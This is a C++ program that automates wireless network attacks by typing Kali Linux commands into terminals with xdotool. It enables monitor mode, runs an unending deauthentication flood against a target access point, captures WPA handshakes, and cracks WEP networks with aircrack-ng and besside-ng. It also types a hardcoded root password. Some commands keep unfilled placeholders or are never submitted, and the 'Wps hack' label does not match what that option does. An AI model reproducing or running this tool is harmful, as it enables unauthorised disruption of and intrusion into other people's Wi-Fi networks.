#include <iostream>
#include <string>
#include <cstdlib>
#include <thread>

// Function to handle different actions based on user input
void handleAction(const std::string& input) {
    if (input == "1") {
        std::system("x-terminal-emulator &"); // Open terminal emulator in the background
    std::system("sleep 1"); // Wait for terminal emulator to open

// access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");

    std::system("sleep 1");

//enabling the moniter mode
    std::system("sleep 1");
    
    std::system("xdotool type \"airmon-ng start wlan0\"");
    std::system("xdotool key Return");

// Playing deauthcaution attack on the wifi
    std::system("xdotool type \"sudo aireplay-ng --deauth 0 -a (bssid) wlan0\"");


// capturing handshake of the wifi
    std::system("x-terminal-emulator &");
    std::system("sleep 1");
    
    // access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");

    std::system("xdotool type \"cd /home/kali/wifi\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"sudo airodump-ng -w (hack1) -c (2) --bssid (bssid) wlan0\"");


    std::system("x-terminal-emulator &");
    std::system("sleep 1");

//checking the wifi that are in the range
    std::system("sleep 1");
    
    // access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");

    std::system("xdotool type \"sudo airodump-ng wlan0\"");
    std::system("xdotool key Return");
    
    } else if (input == "2") {
        std::system("x-terminal-emulator &"); // Open terminal emulator in the background
    std::system("sleep 1"); // Wait for terminal emulator to open

// access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");

//enabling the moniter mode
    std::system("sleep 1");
    
    std::system("xdotool type \"airmon-ng start wlan0\"");
    std::system("xdotool key Return");

//cracking the wep wifi
    std::system("xdotool type \"aircrack-ng ./wep.cap\"");

//capturing packets in the wep wifi
    std::system("x-terminal-emulator &");
    std::system("sleep 1");
    // access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"cd /home/kali/wifi/wepwifi\"");
    std::system("xdotool key Return");

    std::system("xdotool type \"besside-ng wlan0 -c (2) -b (bssid)\"");

//checking the wifi that are in the range
    std::system("x-terminal-emulator &");
    std::system("sleep 1");
    // access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");
    
    std::system("xdotool type \"airodump-ng wlan0 --encrypt wep\"");
    std::system("xdotool key Return");
    } else {
        std::cout << "Unknown input." << std::endl;
    }
}

int main() {
    std::string userInput;

    // Prompt the user for input
    std::cout << "1 - Wps hack\n";
    std::cout << "2 - Wep Hack\n";
    std::cin >> userInput;

    // Call the function based on user input
    handleAction(userInput);

    return 0;
}
